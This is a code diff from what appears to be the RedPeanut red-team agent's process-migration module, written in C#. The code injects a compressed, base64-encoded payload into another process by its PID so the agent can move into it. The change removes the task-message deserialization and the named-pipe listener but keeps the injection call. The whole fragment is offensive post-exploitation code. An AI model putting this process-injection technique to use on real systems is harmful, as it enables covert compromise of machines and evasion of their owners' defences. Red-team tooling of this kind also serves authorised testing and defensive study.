@@ -10,7 +10,6 @@ using System.Web.Script.Serialization;
 class RedPeanutMigrate
 {
     static private string nutclr = "#NUTCLR#";
-    static private string task = "#TASK#";
     static private int pid = Int32.Parse("#PID#");
 
     public static void Execute(string[] args)
@@ -20,16 +19,11 @@ class RedPeanutMigrate
             if (InjectionHelper.Is64bit(pid))
             {
                 Console.WriteLine("[*] Migrating to process " + pid);
-                string rawtask = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
-                RedPeanutAgent.Core.Utility.TaskMsg taskmsg = new JavaScriptSerializer().Deserialize<RedPeanutAgent.Core.Utility.TaskMsg>(rawtask);
 
-                string pipename = GetPipeName(pid);
-                InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, taskmsg);
                 bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));
 
                 if (result)
                 {
-                    injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);
                     throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
                 }
             }
